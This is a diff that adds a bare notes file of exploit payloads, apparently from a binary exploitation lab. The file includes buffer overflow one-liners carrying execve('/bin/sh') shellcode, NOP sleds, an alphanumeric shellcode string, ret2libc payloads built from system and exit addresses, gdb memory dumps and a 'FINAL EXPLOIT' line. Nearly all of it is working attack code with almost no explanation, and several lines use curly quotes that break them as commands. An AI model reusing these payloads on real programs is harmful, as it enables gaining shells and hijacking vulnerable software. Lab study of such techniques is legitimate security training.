@@ -1,0 +1,94 @@
+run $(python -c ‘print “A”*200+"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80”’)
+
+$(python -c "print "A"*3000+"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"")
+
+$(perl -e 'print "\x90"x245,"\x34\xd9\xff\xff" ,"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" ')
+
+
+EXPLOIT 1:
+$(perl -e 'print "\x90"x245,"\x64\xd9\xff\xff" ,"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" ')
+
+
+EXPLOIT 2:
+
+run $( <meow ) $( <arg ) $( <woof )
+
+
+$(perl -e 'print "A"x15 ')  $(perl -e 'print "A"x87, "XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V"')  $(perl -e 'print "A"x15 ')
+
+$(perl -e 'print "A"x15 ')  $(perl -e 'print "A"x87, "XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V"')  $(perl -e 'print "A"x15 ')
+
+XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V (length 87) from address 0xffffdbdd to 0xFFFFDC33 in gdb
+
+buffer starts at 0xffffdb76
+
+0xffffdb76:	0x41414141	0x41414141	0x41414141	0x00414141
+0xffffdb86:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffdb96:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffdba6:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffdbb6:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffdbc6:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffdbd6:	0x41414141	0x58414141	0x54306a58	0x35345859
+0xffffdbe6:	0x33316b50	0x30345856	0x41333734	0x74413174
+0xffffdbf6:	0x31757131	0x71317671	0x79634877	0x79343174
+0xffffdc06:	0x79343348	0x58356a68	0x46315856	0x5346314b
+0xffffdc16:	0x4f463348	0x306a5450	0x50303458	0x34753450
+0xffffdc26:	0x6a345a4e	0x57455357	0x46453831	0x41005630
+0xffffdc36:	0x41414141	0x41414141	0x41414141	0x5f004141
+
+$(python -c 'print "\x90"*6 + "////bin/sh"')
+$(python -c 'print "A"*193')
+$(python -c 'print "\x40\xc8\xe4\xf7" + "\xf0\x07\xe4\xf7" + "\x7d\xdb\xff\xff"')
+
+
+xxxxxxxxxxxxxx | [address to system()] [address to exit()] [address to "///bin/sh/"]
+...
+system => p system (in GDB)
+exit => p exit (in GDB)
+
+
+Exploit 3:
+
+$(perl -e 'print "RUSHKEKEKE","PPPPPR","\x99\x87\x04\x08"')
+run $(perl -e 'print "RUSHKEKEKE","PPPPPR","\x99\x87\x04\x08"') <fv_exploit
+
+RUSHKEKEKE = 604
+farmville starts at 0x08048799 
+
+#USE THIS TO FIND ASCII SUM!
+with open('fv_exploit', 'r') as myfile:
+...     text = myfile.read()
+...     print(sum(map(ord, text)))
+
+41 x 256 = 10,496
+44 x 256 = 11,264
+53 x 256 = 13,568
+
+172 buffer needed:
+
+gdb shellcode address:
+“\x34\xda\xff\xff\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"
+
+gdb shellcode command
+perl -e 'print “&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&k”,”\x34\xda\xff\xff\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"'
+
+#NEED A RETURN ADDRESS AFTER SHELLCODE
+
+#FINAL EXPLOIT
+perl -e 'print “&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&k”,”\x54\xda\xff\xff\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80\x58\xda\xff\xff"'
+
+
+“\x54\xda\xff\xff\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80\x58\xda\xff\xff”
+
+
+Exploit 4:
+
+
+$(python -c 'print "/bin/sh;" + "\x40\xc8\xe4\xf7" +  "\xf0\x07\xe4\xf7" +"\x34\xdc\xff\xff"')
+
+
+
+
+
+
+
